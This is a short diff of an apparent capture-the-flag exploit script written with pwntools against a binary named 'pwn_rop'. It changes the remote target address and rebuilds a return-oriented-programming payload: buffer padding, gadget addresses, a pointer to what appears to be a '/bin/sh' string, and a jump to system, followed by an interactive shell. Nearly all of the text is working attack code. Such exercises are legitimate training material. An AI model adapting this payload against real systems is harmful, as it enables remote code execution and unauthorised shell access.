@@ -5,7 +5,7 @@ from pwn import *
 import sys
 
 if sys.argv[1] == '1':
-    p = remote("114.116.54.89",  10004)
+    p = remote("172.17.0.2",  10000)
 else:
     p = process("./pwn_rop")
 
@@ -19,8 +19,8 @@ print(hex(system_addr))
 
 #pause()
 p.recvuntil("Please Input your name.\n") 
-payload = "a" * 32 + p64(0xdeadbeef) + p64(0x40122b)+ p64(0x402004) 
-payload +=  p64(0x401040)
+payload = "a" * 32 + p64(0xdeadbeef) + p64(0x401016) + p64(0x401016) + p64(0x40126b)+ p64(0x402004) 
+payload +=  p64(0x401050)
 p.sendline(payload)
 
 p.interactive()
